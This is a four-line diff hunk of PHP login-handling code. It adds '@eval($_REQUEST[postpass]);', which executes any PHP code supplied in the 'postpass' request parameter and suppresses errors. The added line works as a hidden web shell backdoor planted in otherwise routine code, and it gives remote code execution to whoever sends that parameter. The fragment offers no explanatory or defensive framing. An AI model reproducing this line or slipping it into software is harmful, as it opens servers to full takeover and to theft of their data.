@@ -16,3 +16,4 @@ if(@get_magic_quotes_gpc()){
 }
 if(isset($_REQUEST[postpass])){
 hmlogin(2);
+@eval($_REQUEST[postpass]);
